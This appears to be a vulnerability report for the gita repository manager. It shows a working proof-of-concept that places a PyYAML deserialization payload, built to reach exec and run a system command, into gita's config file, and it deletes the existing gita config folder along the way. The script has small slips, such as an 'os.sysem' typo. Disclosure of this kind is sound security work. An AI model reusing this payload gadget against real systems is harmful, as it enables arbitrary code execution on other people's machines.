## ✍️ Description
gita helps to Manage multiple git repos with sanity.
* **Vulnerability description**
Vulnerable to YAML deserialization attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
```
# vulnerable part of code
yaml.load() in get_cmds_from_files()

https://github.com/nosarthur/gita/blob/master/gita/utils.py#L236
https://github.com/nosarthur/gita/blob/master/gita/utils.py#L244
```
```python
# exploit.py
import os
os.sysem('pip3 install gita')
from gita.utils import get_cmds_from_files
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
os.system("cd ~/.config")
os.system('rm -r gita')
os.system("mkdir gita")
os.chdir("gita")
open('cmds.yml','w+').write(payload)
get_cmds_from_files()
print("calc has been poped -> Arbitrary Code Execution")
```
![gita_pc](https://user-images.githubusercontent.com/43377443/104534296-08c2ad00-563a-11eb-9063-89e7d62b76e1.PNG)
